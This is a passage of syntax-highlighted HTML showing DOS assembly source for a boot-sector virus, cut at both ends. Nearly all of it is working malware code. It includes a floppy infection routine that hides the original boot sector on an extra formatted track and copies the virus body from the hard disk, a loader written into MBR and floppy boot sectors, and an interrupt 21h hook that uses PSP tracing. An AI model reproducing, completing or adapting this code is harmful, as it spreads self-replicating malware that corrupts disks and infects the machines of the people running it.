                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc4">/</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">sector_loop_crypt</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">sector_loop_crypt</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus floppy infection routine                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">is_floppy_operation</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check of buffer in use by int 21h handler</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Check read operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Over sector 01h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Perform read operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_floppy_read</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">ok_floppy_read</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Save all regs, we are going to trash them</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Check if floppy already infected</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_position</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">boot_marker</span><span class="sc4">-</span><span class="sc5">boot_code</span><span class="sc4">],</span><span class="sc3">"RC"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_infected</span><span class="sc0">

                </span><span class="sc1">;Read original boot sector</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_boot_extra</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check for mbr marker also in floppy</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01FEh</span><span class="sc4">],</span><span class="sc2">0AA55h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_floppy_infection</span><span class="sc0">

                </span><span class="sc1">;Check if dos has been loaded</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">environment_ready</span><span class="sc0">

</span><span class="sc5">exit_floppy_infection</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">environment_ready</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Choose disk device parameter table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">floppy5_25</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0960h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_ddpt_index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">floppy3_5</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B40h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_floppy_infection</span><span class="sc0">

</span><span class="sc5">ok_ddpt_index</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Save some regs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc1">;Get int 1Eh (address where bios stores a pointer to ddpt)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save int 1Eh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old1Eh_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old1Eh_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Hook int 1Eh to our ddpt</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc1">;Point to format table</span><span class="sc0">
                </span><span class="sc1">;(Track 50h,side 00h,200h bytes per sector)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">format_table</span><span class="sc0">

                </span><span class="sc1">;Format the extra track</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0501h</span><span class="sc4">+</span><span class="sc5">inf_sect_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5001h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">extra_track_done</span><span class="sc0">

                </span><span class="sc1">;Restore pointer to read buffer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">abort_floppy</span><span class="sc0">

</span><span class="sc5">extra_track_done</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Restore pointer to read buffer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Write original boot sector on first extra sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">abort_floppy</span><span class="sc0">

                </span><span class="sc1">;Copy virus body from hd to floppy ( sector by sector )</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_sect_size</span><span class="sc0">
</span><span class="sc5">copy_hd_sector</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">inf_sect_size</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">hd_sector_ready</span><span class="sc0">

</span><span class="sc5">replication_error</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_boot_extra</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">abort_floppy</span><span class="sc0">

</span><span class="sc5">hd_sector_ready</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">replication_error</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">copy_hd_sector</span><span class="sc0">

                </span><span class="sc1">;Read original boot sector saved on extra track</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_boot_extra</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">abort_floppy</span><span class="sc0">

                </span><span class="sc1">;Save virus position on disk</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">load_cx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Move virus loader into boot sector</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_position</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boot_code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">boot_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Write loader over floppy boot sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">

                </span><span class="sc1">;Get original boot sector again</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_boot_extra</span><span class="sc0">
</span><span class="sc5">abort_floppy</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore int 1Eh        </span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old1Eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_floppy_infection</span><span class="sc0">

</span><span class="sc5">read_boot_extra</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Read original boot sector saved on extra track</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5001h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_int13h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Perform int 13h call                                                      ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_int13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check for floppy write operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">do_not_use40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">use_int40h</span><span class="sc0">

</span><span class="sc5">do_not_use40h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Perform call</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">use_int40h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Perform call using int 40h</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old40h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus loader ( inserted into hd mbr and floppy boot sectors )             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">boot_code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Setup stack and segment regs</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc1">;Prepare for reading virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc4">+</span><span class="sc5">inf_sect_size</span><span class="sc0">

                </span><span class="sc1">;Read at 0000h:7E00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7E00h</span><span class="sc0">

                </span><span class="sc1">;Get position in disk</span><span class="sc0">
                </span><span class="sc1">;mov cx,XXXXh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc0">
</span><span class="sc5">load_cx</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">

                </span><span class="sc1">;Read virus body next to loader</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_init</span><span class="sc0">

                </span><span class="sc1">;Continue execution on virus body        </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">error_init</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Error during virus initialization</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Floppy boot sector infected marker                                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">boot_marker</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CR"</span><span class="sc0">
                </span><span class="sc1">;End of boot code</span><span class="sc0">
</span><span class="sc5">boot_end</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Hook int 21h ( try to find original int 21h address using psp tracing )   ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">hook_dos</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save regs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Check if dos has been loaded</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_wait</span><span class="sc0">

                </span><span class="sc1">;Set dos loaded flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">

                </span><span class="sc1">;Restore bios allocated memory</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">],</span><span class="sc5">mem_kb_size</span><span class="sc0">

                </span><span class="sc1">;Check dos version</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">exit_wait</span><span class="sc0">

                </span><span class="sc1">;Get our segment</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Get int 21h vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save old int 21h vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old21h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old21h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Save old 21h as original for errors on psp tracing</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">org21h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">org21h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Point int 21h to our handler</span><span class="sc0">
